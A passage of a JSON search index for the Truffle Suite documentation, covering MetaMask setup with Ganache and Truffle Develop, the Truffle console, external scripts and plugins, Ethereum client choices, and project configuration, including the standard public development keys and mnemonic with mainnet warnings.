connects to an Ethereum network without running a full node on the browser's machine. It can connect to the main Ethereum network, any of the testnets (Ropsten, Kovan, and Rinkeby), or a local blockchain such as the one created by Ganache or Truffle Develop. For development with Truffle this means we can use our dapp the same way users will interact with it on a live network.","title":"What is MetaMask?"},{"location":"docs/truffle/getting-started/truffle-with-metamask.html#installing-metamask","text":"To install MetaMask for Chrome, go to the Chrome Web Store and click the Add to Chrome button. To install MetaMask for FireFox, go to the Firefox Add-ons page and click the Add to Firefox button. With our front-end ready to be used and MetaMask installed, we're ready to see our dapp in all its glory.","title":"Installing MetaMask"},{"location":"docs/truffle/getting-started/truffle-with-metamask.html#using-metamask-with-ganache","text":"Ganache is a graphical application that runs a blockchain that can be used for testing purposes. It runs on 127.0.0.1:7545 . Note : We recommend specifying 127.0.0.1 instead of localhost because the address does not require a network connection and so is more suitable for development.","title":"Using MetaMask with Ganache"},{"location":"docs/truffle/getting-started/truffle-with-metamask.html#detecting-metamasks-web3-injection","text":"Before diving in, we'll need to make sure the dapp is checking for MetaMask's web3 instance and that the extension itself is configured properly with Ganache. MetaMask injects its own web3 instance, so we'll want to make sure we're checking for that. After the window has loaded perform the following check: // Is there is an injected web3 instance? if ( typeof web3 !== 'undefined' ) { App . web3Provider = web3 . currentProvider ; web3 = new Web3 ( web3 . currentProvider ); } else { // If no injected web3 instance is detected, fallback to Ganache. App . web3Provider = new web3 . providers . HttpProvider ( 'http://127.0.0.1:7545' ); web3 = new Web3 ( App . web3Provider ); }","title":"Detecting MetaMask's web3 injection"},{"location":"docs/truffle/getting-started/truffle-with-metamask.html#setting-up-metamask","text":"To use Ganache with MetaMask, click the MetaMask icon in your browser and this screen will appear: MetaMask initial screen Click Import with seed phrase . In the box marked Wallet Seed , enter the mnemonic that was displayed when launching Ganache. Warning : Do not use this mnemonic on the main Ethereum network (mainnet). Make sure that you set the network to \"Private Network\" (use the \"Custom RPC\" setting). See below for details. Enter a password below that and click OK . MetaMask seed phrase Now we need to connect MetaMask to the blockchain created by Ganache. Click the menu that shows \"Main Network\" and select Custom RPC . MetaMask network menu In the box titled \"New RPC URL\" (to the right of \"New Network\") enter http://127.0.0.1:7545 and click Save . The network name at the top will switch to say \"Private Network\". Click the cross in the top-right of the current window close out of the page and return to the Accounts page. Now that we've connected MetaMask to Ganache, you'll be taken to the accounts screen. Each account created by Ganache is given 100 ether. The first account should have less than the others because that account supplies the gas for smart contract deployment. Since you've deployed your smart contract to the network, this account paid for it. Click the account icon in the upper-right to create new accounts, the first 10 of which will correspond to the 10 accounts displayed when you launched Ganache. MetaMask account","title":"Setting up MetaMask"},{"location":"docs/truffle/getting-started/truffle-with-metamask.html#using-metamask-with-truffle-develop","text":"Truffle Develop is a command-line application that runs a temporary blockchain that is also used for testing purposes. It runs on 127.0.0.1:9545 . Note : We recommend specifying 127.0.0.1 instead of localhost because the address does not require a network connection and so is more suitable for development. Using MetaMask with Truffle Develop is very similar to that of Ganache. The only difference is that Truffle Develop runs by default on 127.0.0.1:9545 , so you'll want to edit the above web3 code to say: // Is there is an injected web3 instance? if ( typeof web3 !== 'undefined' ) { App . web3Provider = web3 . currentProvider ; web3 = new Web3 ( web3 . currentProvider ); } else { // If no injected web3 instance is detected, fallback to Truffle Develop. App . web3Provider = new web3 . providers . HttpProvider ( 'http://127.0.0.1:9545' ); web3 = new Web3 ( App . web3Provider ); } In MetaMask, when entering the \"New RPC URL\", enter http://127.0.0.1:9545 .","title":"Using MetaMask with Truffle Develop"},{"location":"docs/truffle/getting-started/truffle-with-metamask.html#using-metamask-with-ganache-cli","text":"Using MetaMask with Ganache CLI is also very similar to that of Ganache. The only difference is that Ganache CLI runs by default on http://127.0.0.1:8545 so you'll want to edit the above web3 code to say: // Is there is an injected web3 instance? if ( typeof web3 !== 'undefined' ) { App . web3Provider = web3 . currentProvider ; web3 = new Web3 ( web3 . currentProvider ); } else { // If no injected web3 instance is detected, fallback to Ganache CLI. App . web3Provider = new web3 . providers . HttpProvider ( 'http://127.0.0.1:8545' ); web3 = new Web3 ( App . web3Provider ); } In MetaMask, when entering the \"New RPC URL\", enter http://127.0.0.1:8545 .","title":"Using MetaMask with Ganache CLI"},{"location":"docs/truffle/getting-started/using-the-build-pipeline.html","text":"Using the Build Pipeline \u00b6 Alert : This command is deprecated. Please use third-party build tools like webpack or grunt, or see our Truffle Boxes for an example. Truffle 1.0 and 2.0 came standard with a default build system heavily geared toward web applications (here, the term \"build\" means turning code artifacts into HTML, Javascript and CSS). That build system has been pulled out into its own module to make Truffle usable and extensible for all kinds of applications. Truffle can be configured for tight integration with any build system. To configure a custom build system, see the Advanced Build Processes section for more details. Command \u00b6 To build your application when a build system is configured, run: $ truffle build Note you'll receive an error if you try to run the build command without first configuring a custom build process.","title":"Using the Build Pipeline"},{"location":"docs/truffle/getting-started/using-the-build-pipeline.html#using-the-build-pipeline","text":"Alert : This command is deprecated. Please use third-party build tools like webpack or grunt, or see our Truffle Boxes for an example. Truffle 1.0 and 2.0 came standard with a default build system heavily geared toward web applications (here, the term \"build\" means turning code artifacts into HTML, Javascript and CSS). That build system has been pulled out into its own module to make Truffle usable and extensible for all kinds of applications. Truffle can be configured for tight integration with any build system. To configure a custom build system, see the Advanced Build Processes section for more details.","title":"Using the Build Pipeline"},{"location":"docs/truffle/getting-started/using-the-build-pipeline.html#command","text":"To build your application when a build system is configured, run: $ truffle build Note you'll receive an error if you try to run the build command without first configuring a custom build process.","title":"Command"},{"location":"docs/truffle/getting-started/using-truffle-develop-and-the-console.html","text":"Using Truffle Develop and the Console \u00b6 Sometimes it's nice to work with your contracts interactively for testing and debugging purposes, or for executing transactions by hand. Truffle provides you two easy ways to do this via an interactive console, with your contracts available and ready to use. Truffle Console : A basic interactive console connecting to any Ethereum client Truffle Develop : An interactive console that also spawns a development blockchain Note : Your contract names get loaded as variables into the console context. For this reason it is recommended to avoid names that might conflict with Node's native objects like Buffer or String. For updates see the related issue on GitHub . Why two different consoles? \u00b6 Having two different consoles allows you to choose the best tool for your needs. Reasons to use Truffle Console : You have a client you're already using, such as Ganache or geth You want to migrate to a testnet (or the main Ethereum network) You want to use a specific mnemonic or account list Reasons to use Truffle Develop : You are testing your project with no intention of immediately deploying You don't need to work with specific accounts (and you're fine with using default development accounts) You don't want to install and manage a separate blockchain client Commands \u00b6 All commands require that you be in your project folder. You do not need to be at the root. Console \u00b6 To launch the console: truffle console This will look for a network definition called development in the configuration, and connect to it, if available. You can override this using the --network <name> option or customize the development network settings. See more details in the Networks section as well as the command reference . When you load the console, you'll immediately see the following prompt: truffle ( development ) > This tells you you're running within a Truffle console using the development network. Truffle Develop \u00b6 To launch Truffle Develop: truffle develop This will spawn a development blockchain locally on port 9545 by default. If you already have a truffle develop session running, it will instead connect to that development blockchain. When you load Truffle Develop, you will see the following: Truffle Develop started at http://localhost:9545/ Accounts: ( 0 ) 0x627306090abab3a6e1400e9345bc60c78a8bef57 ( 1 ) 0xf17f52151ebef6c7334fad080c5704d77216b732 ( 2 ) 0xc5fdf4076b8f3a5357c5e395ab970b5b54098fef ( 3 ) 0x821aea9a577a9b44299b9c15c88cf3087f3b5544 ( 4 ) 0x0d1d4e623d10f9fba5db95830f7d3839406c6af2 ( 5 ) 0x2932b7a2355d6fecc4b5c0b6bd44cc31df247a2e ( 6 ) 0x2191ef87e392377ec08e7c08eb105ef5448eced5 ( 7 ) 0x0f4f2ac550a1b4e2280d04c21cea7ebd822934b5 ( 8 ) 0x6330a553fc93768f612722bb8c2ec78ac90b3bbc ( 9 ) 0x5aeda56215b167893e80b4fe645ba6d5bab767de Private Keys: ( 0 ) c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3 ( 1 ) ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f ( 2 ) 0dbbe8e4ae425a6d2687f1a7e3ba17bc98c673636790f1b8ad91193c05875ef1 ( 3 ) c88b703fb08cbea894b6aeff5a544fb92e78a18e19814cd85da83b71f772aa6c ( 4 ) 388c684f0ba1ef5017716adb5d21a053ea8e90277d0868337519f97bede61418 ( 5 ) 659cbb0e2411a44db63778987b1e22153c086a95eb6b18bdf89de078917abc63 ( 6 ) 82d052c865f5763aad42add438569276c00d3d88a2d062d36b2bae914d58b8c8 ( 7 ) aa3680d5d48a8283413f7a108367c7299ca73f553735860a87b08f39395618b7 ( 8 ) 0f62d96d6675f32685bbdb8ac13cda7c23436f63efbb9d07700d8669ff12b7c4 ( 9 ) 8d5366123cb560bb606379f90a0bfd4769eecc0557f1b362dcae9012b548b1e5 Mnemonic: candy maple cake sugar pudding cream honey rich smooth crumble sweet treat This shows you the addresses, private keys, and mnemonic for this particular blockchain. Note : When you run truffle develop for the first time, Truffle will generate a random mnemonic that will persist for you and you alone. If you want to use a different mnemonic or set of addresses, we recommend using Ganache . Warning : Remember to never use any of these addresses or the mnemonic on the mainnet. This is for development only. Log RPC Activity \u00b6 If you wish to see information regarding RPC activity during your Truffle develop session, you can use the --log option. When you run truffle develop --log , Truffle will start up a new develop session and output the addresses and keys as described in the previous section. However, in this terminal window you will not be able to interact with the console like you would in a normal Truffle develop session. Instead it will only output the RPC activity occurring on the network. If you want to interact with the console, you will have to open a new terminal window and connect to the current session by running truffle develop . If you already have a Truffle develop session running and want to log all RPC activity occurring on it, you can run truffle develop --log in a separate terminal window. It will then connect to that session and act the same way as described above. Configuring Truffle Develop \u00b6 You can configure truffle develop to use any of the available ganache-core options and configurable network settings. For example: module . exports = { /* ... rest of config */ networks : { /* ... other networks */ develop : { port : 8545 , network_id : 20 , accounts : 5 , defaultEtherBalance : 500 , blockTime : 3 } } }; Features \u00b6 Both Truffle Develop and the console provide most of the features available in the Truffle command line tool. For instance, you can type migrate --reset within the console, and it will be interpreted the same as if you ran truffle migrate --reset on the command line. Additionally, both Truffle Develop and the console have the following features: All of your compiled contracts are available and ready for use. After each command (such as migrate --reset ) your contracts are reprovisioned so you can start using the newly assigned addresses and binaries immediately. The web3 library is made available and is set to connect to your Ethereum client. Commands available \u00b6 build compile create debug deploy exec help install migrate networks opcode publish run test version If a Truffle command is not available, it is because it is not relevant for an existing project (for example, init ) wouldn't make sense (for example, develop or console ). See full command reference for more information.","title":"Using Truffle Develop and the Console"},{"location":"docs/truffle/getting-started/using-truffle-develop-and-the-console.html#using-truffle-develop-and-the-console","text":"Sometimes it's nice to work with your contracts interactively for testing and debugging purposes, or for executing transactions by hand. Truffle provides you two easy ways to do this via an interactive console, with your contracts available and ready to use. Truffle Console : A basic interactive console connecting to any Ethereum client Truffle Develop : An interactive console that also spawns a development blockchain Note : Your contract names get loaded as variables into the console context. For this reason it is recommended to avoid names that might conflict with Node's native objects like Buffer or String. For updates see the related issue on GitHub .","title":"Using Truffle Develop and the Console"},{"location":"docs/truffle/getting-started/using-truffle-develop-and-the-console.html#why-two-different-consoles","text":"Having two different consoles allows you to choose the best tool for your needs. Reasons to use Truffle Console : You have a client you're already using, such as Ganache or geth You want to migrate to a testnet (or the main Ethereum network) You want to use a specific mnemonic or account list Reasons to use Truffle Develop : You are testing your project with no intention of immediately deploying You don't need to work with specific accounts (and you're fine with using default development accounts) You don't want to install and manage a separate blockchain client","title":"Why two different consoles?"},{"location":"docs/truffle/getting-started/using-truffle-develop-and-the-console.html#commands","text":"All commands require that you be in your project folder. You do not need to be at the root.","title":"Commands"},{"location":"docs/truffle/getting-started/using-truffle-develop-and-the-console.html#console","text":"To launch the console: truffle console This will look for a network definition called development in the configuration, and connect to it, if available. You can override this using the --network <name> option or customize the development network settings. See more details in the Networks section as well as the command reference . When you load the console, you'll immediately see the following prompt: truffle ( development ) > This tells you you're running within a Truffle console using the development network.","title":"Console"},{"location":"docs/truffle/getting-started/using-truffle-develop-and-the-console.html#truffle-develop","text":"To launch Truffle Develop: truffle develop This will spawn a development blockchain locally on port 9545 by default. If you already have a truffle develop session running, it will instead connect to that development blockchain. When you load Truffle Develop, you will see the following: Truffle Develop started at http://localhost:9545/ Accounts: ( 0 ) 0x627306090abab3a6e1400e9345bc60c78a8bef57 ( 1 ) 0xf17f52151ebef6c7334fad080c5704d77216b732 ( 2 ) 0xc5fdf4076b8f3a5357c5e395ab970b5b54098fef ( 3 ) 0x821aea9a577a9b44299b9c15c88cf3087f3b5544 ( 4 ) 0x0d1d4e623d10f9fba5db95830f7d3839406c6af2 ( 5 ) 0x2932b7a2355d6fecc4b5c0b6bd44cc31df247a2e ( 6 ) 0x2191ef87e392377ec08e7c08eb105ef5448eced5 ( 7 ) 0x0f4f2ac550a1b4e2280d04c21cea7ebd822934b5 ( 8 ) 0x6330a553fc93768f612722bb8c2ec78ac90b3bbc ( 9 ) 0x5aeda56215b167893e80b4fe645ba6d5bab767de Private Keys: ( 0 ) c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3 ( 1 ) ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f ( 2 ) 0dbbe8e4ae425a6d2687f1a7e3ba17bc98c673636790f1b8ad91193c05875ef1 ( 3 ) c88b703fb08cbea894b6aeff5a544fb92e78a18e19814cd85da83b71f772aa6c ( 4 ) 388c684f0ba1ef5017716adb5d21a053ea8e90277d0868337519f97bede61418 ( 5 ) 659cbb0e2411a44db63778987b1e22153c086a95eb6b18bdf89de078917abc63 ( 6 ) 82d052c865f5763aad42add438569276c00d3d88a2d062d36b2bae914d58b8c8 ( 7 ) aa3680d5d48a8283413f7a108367c7299ca73f553735860a87b08f39395618b7 ( 8 ) 0f62d96d6675f32685bbdb8ac13cda7c23436f63efbb9d07700d8669ff12b7c4 ( 9 ) 8d5366123cb560bb606379f90a0bfd4769eecc0557f1b362dcae9012b548b1e5 Mnemonic: candy maple cake sugar pudding cream honey rich smooth crumble sweet treat This shows you the addresses, private keys, and mnemonic for this particular blockchain. Note : When you run truffle develop for the first time, Truffle will generate a random mnemonic that will persist for you and you alone. If you want to use a different mnemonic or set of addresses, we recommend using Ganache . Warning : Remember to never use any of these addresses or the mnemonic on the mainnet. This is for development only.","title":"Truffle Develop"},{"location":"docs/truffle/getting-started/using-truffle-develop-and-the-console.html#log-rpc-activity","text":"If you wish to see information regarding RPC activity during your Truffle develop session, you can use the --log option. When you run truffle develop --log , Truffle will start up a new develop session and output the addresses and keys as described in the previous section. However, in this terminal window you will not be able to interact with the console like you would in a normal Truffle develop session. Instead it will only output the RPC activity occurring on the network. If you want to interact with the console, you will have to open a new terminal window and connect to the current session by running truffle develop . If you already have a Truffle develop session running and want to log all RPC activity occurring on it, you can run truffle develop --log in a separate terminal window. It will then connect to that session and act the same way as described above.","title":"Log RPC Activity"},{"location":"docs/truffle/getting-started/using-truffle-develop-and-the-console.html#configuring-truffle-develop","text":"You can configure truffle develop to use any of the available ganache-core options and configurable network settings. For example: module . exports = { /* ... rest of config */ networks : { /* ... other networks */ develop : { port : 8545 , network_id : 20 , accounts : 5 , defaultEtherBalance : 500 , blockTime : 3 } } };","title":"Configuring Truffle Develop"},{"location":"docs/truffle/getting-started/using-truffle-develop-and-the-console.html#features","text":"Both Truffle Develop and the console provide most of the features available in the Truffle command line tool. For instance, you can type migrate --reset within the console, and it will be interpreted the same as if you ran truffle migrate --reset on the command line. Additionally, both Truffle Develop and the console have the following features: All of your compiled contracts are available and ready for use. After each command (such as migrate --reset ) your contracts are reprovisioned so you can start using the newly assigned addresses and binaries immediately. The web3 library is made available and is set to connect to your Ethereum client.","title":"Features"},{"location":"docs/truffle/getting-started/using-truffle-develop-and-the-console.html#commands-available","text":"build compile create debug deploy exec help install migrate networks opcode publish run test version If a Truffle command is not available, it is because it is not relevant for an existing project (for example, init ) wouldn't make sense (for example, develop or console ). See full command reference for more information.","title":"Commands available"},{"location":"docs/truffle/getting-started/writing-external-scripts.html","text":"Writing External Scripts \u00b6 Often you may want to run external scripts that interact with your contracts. Truffle provides an easy way to do this, bootstrapping your contracts based on your desired network and connecting to your Ethereum client automatically per your project configuration . Command \u00b6 To run an external script, perform the following: $ truffle exec <path/to/file.js> Refer to Truffle Commands Reference for more information about this command, such as what options it accepts. File structure \u00b6 In order for external scripts to be run correctly, Truffle expects them to export a function that takes a single parameter as a callback: module . exports = function ( callback ) { // perform actions } You can do anything you'd like within this script, so long as the callback is called when the script finishes. The callback accepts an error as its first and only parameter. If an error is provided, execution will halt and the process will return a non-zero exit code. Third-party plugin commands \u00b6 Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Plugin installation / usage \u00b6 Install the plugin from NPM. npm install --save-dev truffle-plugin-hello Add a plugins section to your Truffle config. module . exports = { /* ... rest of truffle-config */ plugins : [ \"truffle-plugin-hello\" ] } Run the command $ truffle run hello Hello, World! Creating a custom command plugin \u00b6 Implement the command as a Node module with a function as its default export. Example: hello.js /** * Outputs `Hello, World!` when running `truffle run hello`, * or `Hello, ${name}` when running `truffle run hello [name]` * @param {Config} config - A truffle-config object. * Has attributes like `truffle_directory`, `working_directory`, etc. */ module . exports = async ( config ) => { // config._ has the command arguments. // config_[0] is the command name, e.g. \"hello\" here. // config_[1] starts remaining parameters. if ( config . help ) { console . log ( `Usage: truffle run hello [name]` ); return ; } let name = config . _ . length > 1 ? config . _ [ 1 ] : 'World!' ; console . log ( `Hello, ${ name } ` ); } Define a truffle-plugin.json file to specify the command. Example: truffle-plugin.json { \"commands\" : { \"hello\" : \"hello.js\" } } Publish to NPM npm publish Importing Truffle as a module \u00b6 const truffle = require ( \"truffle\" ); Beginning with v5.0.30 , Truffle exports the methods listed in core/index.js . This means your plugin can consume the user's Truffle instance as a library and access a subset of its internal command APIs. These are useful if you need to touch several Truffle commands in succession. For example, imagine a plugin that evaluated how a contract system performed at different levels of solc optimization. Its workflow might look like: for a range of solc settings: compile contracts to a temp folder run user's tests using the temp artifacts measure and save gas usage data aggregate data and report The Truffle library lets you do this without making the user add configuration or string their own commands together. Warning : Truffle does not guarantee its internal APIs will follow semver. You should be prepared for your user to run any Truffle version and handle mismatches gracefully. By using the library you are entering into an agreement to manage API volatility and other contingencies on your users' behalf. Some tips: \u2022 Always require Truffle in a try/catch block \u2022 At runtime, verify the API components you need are actually exposed \u2022 Consume separately published (and semver guaranteed) Truffle modules when possible \u2022 Add yourself to the Truffle repo watch list on GitHub and keep abreast of internal changes that might affect you. \u2022 Do not go on vacation","title":"Writing External Scripts / Command Plugins"},{"location":"docs/truffle/getting-started/writing-external-scripts.html#writing-external-scripts","text":"Often you may want to run external scripts that interact with your contracts. Truffle provides an easy way to do this, bootstrapping your contracts based on your desired network and connecting to your Ethereum client automatically per your project configuration .","title":"Writing External Scripts"},{"location":"docs/truffle/getting-started/writing-external-scripts.html#command","text":"To run an external script, perform the following: $ truffle exec <path/to/file.js> Refer to Truffle Commands Reference for more information about this command, such as what options it accepts.","title":"Command"},{"location":"docs/truffle/getting-started/writing-external-scripts.html#file-structure","text":"In order for external scripts to be run correctly, Truffle expects them to export a function that takes a single parameter as a callback: module . exports = function ( callback ) { // perform actions } You can do anything you'd like within this script, so long as the callback is called when the script finishes. The callback accepts an error as its first and only parameter. If an error is provided, execution will halt and the process will return a non-zero exit code.","title":"File structure"},{"location":"docs/truffle/getting-started/writing-external-scripts.html#third-party-plugin-commands","text":"Note : This feature is new and still in a barebones state. Please let us know how we can improve it!","title":"Third-party plugin commands"},{"location":"docs/truffle/getting-started/writing-external-scripts.html#plugin-installation-usage","text":"Install the plugin from NPM. npm install --save-dev truffle-plugin-hello Add a plugins section to your Truffle config. module . exports = { /* ... rest of truffle-config */ plugins : [ \"truffle-plugin-hello\" ] } Run the command $ truffle run hello Hello, World!","title":"Plugin installation / usage"},{"location":"docs/truffle/getting-started/writing-external-scripts.html#creating-a-custom-command-plugin","text":"Implement the command as a Node module with a function as its default export. Example: hello.js /** * Outputs `Hello, World!` when running `truffle run hello`, * or `Hello, ${name}` when running `truffle run hello [name]` * @param {Config} config - A truffle-config object. * Has attributes like `truffle_directory`, `working_directory`, etc. */ module . exports = async ( config ) => { // config._ has the command arguments. // config_[0] is the command name, e.g. \"hello\" here. // config_[1] starts remaining parameters. if ( config . help ) { console . log ( `Usage: truffle run hello [name]` ); return ; } let name = config . _ . length > 1 ? config . _ [ 1 ] : 'World!' ; console . log ( `Hello, ${ name } ` ); } Define a truffle-plugin.json file to specify the command. Example: truffle-plugin.json { \"commands\" : { \"hello\" : \"hello.js\" } } Publish to NPM npm publish","title":"Creating a custom command plugin"},{"location":"docs/truffle/getting-started/writing-external-scripts.html#importing-truffle-as-a-module","text":"const truffle = require ( \"truffle\" ); Beginning with v5.0.30 , Truffle exports the methods listed in core/index.js . This means your plugin can consume the user's Truffle instance as a library and access a subset of its internal command APIs. These are useful if you need to touch several Truffle commands in succession. For example, imagine a plugin that evaluated how a contract system performed at different levels of solc optimization. Its workflow might look like: for a range of solc settings: compile contracts to a temp folder run user's tests using the temp artifacts measure and save gas usage data aggregate data and report The Truffle library lets you do this without making the user add configuration or string their own commands together. Warning : Truffle does not guarantee its internal APIs will follow semver. You should be prepared for your user to run any Truffle version and handle mismatches gracefully. By using the library you are entering into an agreement to manage API volatility and other contingencies on your users' behalf. Some tips: \u2022 Always require Truffle in a try/catch block \u2022 At runtime, verify the API components you need are actually exposed \u2022 Consume separately published (and semver guaranteed) Truffle modules when possible \u2022 Add yourself to the Truffle repo watch list on GitHub and keep abreast of internal changes that might affect you. \u2022 Do not go on vacation","title":"Importing Truffle as a module"},{"location":"docs/truffle/reference/choosing-an-ethereum-client.html","text":"Choosing an Ethereum client \u00b6 There are many Ethereum clients to choose from. We recommend different clients depending on whether you are developing or deploying. When developing \u00b6 Ganache \u00b6 We recommend Ganache , a personal blockchain for Ethereum development that runs on your desktop. Part of the Truffle Suite, Ganache simplifies dapp development by placing your contracts and transactions front and center. Using Ganache you can quickly see how your application affects the blockchain, and introspect details like your accounts, balances, contract creations and gas costs. You can also fine tune Ganache's advanced mining controls to better suit your needs. Ganache is available for Windows, Mac and Linux, and you can download it here . Ganache, when launched, runs on http://127.0.0.1:7545 . It will display the first 10 accounts and the mnemonic used to create those accounts. ( Read more about account mnemonics .) The mnemonic will persist across restarts of Ganache, though it can be changed to be randomly generated. You can also input your own . Warning : Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all! Truffle Develop \u00b6 We also recommend using Truffle Develop, a development blockchain built directly into Truffle. Truffle Develop helps you set up an integrated blockchain environment with a single command, no installation required. Run Truffle Develop by typing the following into a terminal: truffle develop This will run the client on http://127.0.0.1:9545 . It will display the first 10 accounts and the mnemonic used to create those accounts. ( Read more about account mnemonics .) When you run truffle develop for the first time it will generate a random mnemonic that will persist for you and you alone. Warning : Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all! Once launched, Truffle Develop will provide you with a console you can use to run all available Truffle commands. These commands are input by omitting the truffle prefix. So, for example, to compile your smart contracts, instead of typing truffle compile , you need to only type compile . To read more about interacting with the console, please see the Using the Console section. Ganache CLI \u00b6 Ganache also has a command-line interface for those who aren't working from a graphical environment. Great for automated testing and continuous integration environments, Ganache CLI runs headless and can be configured to serve all your development needs. Ganache CLI processes transactions instantly instead of waiting for the default block time, so you can test that your code works quickly. It also tells you immediately when your smart contracts run into errors, and integrates directly with Truffle to reduce test runtime up to 90% compared to other clients. Learn more about Ganache CLI . Deploying to live networks \u00b6 There are many official and unofficial Ethereum clients available for you to use. The following is a short list: Geth (go-ethereum): https://github.com/ethereum/go-ethereum WebThree (cpp-ethereum): https://github.com/ethereum/cpp-ethereum Hyperledger Besu (java): https://github.com/hyperledger/besu Parity: https://github.com/paritytech/parity Nethermind: https://github.com/NethermindEth/nethermind More: https://ethereum.org/developers/#clients--running-your-own-node These are full client implementations that include mining, networking, blocks and transaction processing. You should use these clients after you've sufficiently tested your dapp with Ganache or Truffle Develop and you're ready to deploy to your desired Ethereum network. Deploying to private networks \u00b6 Private networks utilize the same technology as with live networks, but with a different configuration. So you can configure any of the Ethereum clients mentioned above to run a private network, and deploy to it in exactly the same way.","title":"Choosing an Ethereum Client"},{"location":"docs/truffle/reference/choosing-an-ethereum-client.html#choosing-an-ethereum-client","text":"There are many Ethereum clients to choose from. We recommend different clients depending on whether you are developing or deploying.","title":"Choosing an Ethereum client"},{"location":"docs/truffle/reference/choosing-an-ethereum-client.html#when-developing","text":"","title":"When developing"},{"location":"docs/truffle/reference/choosing-an-ethereum-client.html#ganache","text":"We recommend Ganache , a personal blockchain for Ethereum development that runs on your desktop. Part of the Truffle Suite, Ganache simplifies dapp development by placing your contracts and transactions front and center. Using Ganache you can quickly see how your application affects the blockchain, and introspect details like your accounts, balances, contract creations and gas costs. You can also fine tune Ganache's advanced mining controls to better suit your needs. Ganache is available for Windows, Mac and Linux, and you can download it here . Ganache, when launched, runs on http://127.0.0.1:7545 . It will display the first 10 accounts and the mnemonic used to create those accounts. ( Read more about account mnemonics .) The mnemonic will persist across restarts of Ganache, though it can be changed to be randomly generated. You can also input your own . Warning : Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all!","title":"Ganache"},{"location":"docs/truffle/reference/choosing-an-ethereum-client.html#truffle-develop","text":"We also recommend using Truffle Develop, a development blockchain built directly into Truffle. Truffle Develop helps you set up an integrated blockchain environment with a single command, no installation required. Run Truffle Develop by typing the following into a terminal: truffle develop This will run the client on http://127.0.0.1:9545 . It will display the first 10 accounts and the mnemonic used to create those accounts. ( Read more about account mnemonics .) When you run truffle develop for the first time it will generate a random mnemonic that will persist for you and you alone. Warning : Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all! Once launched, Truffle Develop will provide you with a console you can use to run all available Truffle commands. These commands are input by omitting the truffle prefix. So, for example, to compile your smart contracts, instead of typing truffle compile , you need to only type compile . To read more about interacting with the console, please see the Using the Console section.","title":"Truffle Develop"},{"location":"docs/truffle/reference/choosing-an-ethereum-client.html#ganache-cli","text":"Ganache also has a command-line interface for those who aren't working from a graphical environment. Great for automated testing and continuous integration environments, Ganache CLI runs headless and can be configured to serve all your development needs. Ganache CLI processes transactions instantly instead of waiting for the default block time, so you can test that your code works quickly. It also tells you immediately when your smart contracts run into errors, and integrates directly with Truffle to reduce test runtime up to 90% compared to other clients. Learn more about Ganache CLI .","title":"Ganache CLI"},{"location":"docs/truffle/reference/choosing-an-ethereum-client.html#deploying-to-live-networks","text":"There are many official and unofficial Ethereum clients available for you to use. The following is a short list: Geth (go-ethereum): https://github.com/ethereum/go-ethereum WebThree (cpp-ethereum): https://github.com/ethereum/cpp-ethereum Hyperledger Besu (java): https://github.com/hyperledger/besu Parity: https://github.com/paritytech/parity Nethermind: https://github.com/NethermindEth/nethermind More: https://ethereum.org/developers/#clients--running-your-own-node These are full client implementations that include mining, networking, blocks and transaction processing. You should use these clients after you've sufficiently tested your dapp with Ganache or Truffle Develop and you're ready to deploy to your desired Ethereum network.","title":"Deploying to live networks"},{"location":"docs/truffle/reference/choosing-an-ethereum-client.html#deploying-to-private-networks","text":"Private networks utilize the same technology as with live networks, but with a different configuration. So you can configure any of the Ethereum clients mentioned above to run a private network, and deploy to it in exactly the same way.","title":"Deploying to private networks"},{"location":"docs/truffle/reference/configuration.html","text":"Configuration \u00b6 Location \u00b6 Your configuration file is called truffle-config.js and is located at the root of your project directory. This file is a Javascript file and can execute any code necessary to create your configuration. It must export an object representing your project configuration like the example below. module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" // Match any network id } }, compilers : { solc : { version : \"^0.8.0\" } } }; Be sure to check out the truffle-config.js contained by the barebones project that truffle init creates. The truffle-config.js contains a handful of commented out examples of some configuration options that you might specify/tweak. Resolving naming conflicts on Windows \u00b6 Note : This only applies to Truffle version 4 and below. When using the Command Prompt on Windows, the default configuration file name can cause a conflict with the truffle executable, and so you may not be able to run Truffle commands properly on existing projects . This is because of the way that command precedence works on the Command Prompt. The truffle.cmd executable is on the path as part of the npm package, but the truffle.js configuration file is in the actual directory where the truffle command is run. Because .js is an acceptable executable extension by default, truffle.js takes precedence over truffle.cmd , causing unexpected results. Any of the following solutions will remedy this issue: Call the executable file explicitly using its .cmd extension ( truffle.cmd compile ) Edit the system PATHEXT environment variable and remove .JS; from the list of executable extensions Rename truffle.js to something else ( truffle-config.js ) Use Windows PowerShell or Git BASH , as these shells do not have this conflict. General options \u00b6 build \u00b6 Build configuration of your application, if your application requires tight integration with Truffle. Most users likely will not need to configure this option. See the Build Processes section for more details. networks \u00b6 Specifies which networks are available for deployment during migrations, as well as specific transaction parameters when interacting with each network (such as gas price, from address, etc.). When compiling and running migrations on a specific network, contract artifacts will be saved and recorded for later use. When your contract abstractions detect that your Ethereum client is connected to a specific network, they'll use the contract artifacts associated that network to simplify app deployment. Networks are identified through Ethereum's net_version RPC call, as well as blockchain URIs. The networks object, shown below, is keyed by network names and each name contains a corresponding object that defines the parameters of the network. You will most likely want to provide your own network names and configurations to tell Truffle what networks to connect to for deployments and testing. Once you have defined your networks, you can provide the names as an option for certain commands; this is possible during testing or running migrations. You might specify a network name during migrations as follows: $ truffle migrate --network live Note that if no --network option is provided when using commands that require a network, Truffle will by default look for a network named \"development\" in your truffle-config.js . It will then use those settings to try and connect. See the provided examples below for some guidance on defining your networks. Example: networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , // match any network websockets : true }, live : { host : \"178.25.19.88\" , // Random IP for example purposes (do not use) port : 80 , network_id : 1 , // Ethereum public network // optional config values: // gas // gasPrice // from - default address to use for any transaction Truffle makes during migrations // provider - web3 provider instance Truffle should use to talk to the Ethereum network. // - function that returns a web3 provider instance (see below.) // - if specified, host and port are ignored. // 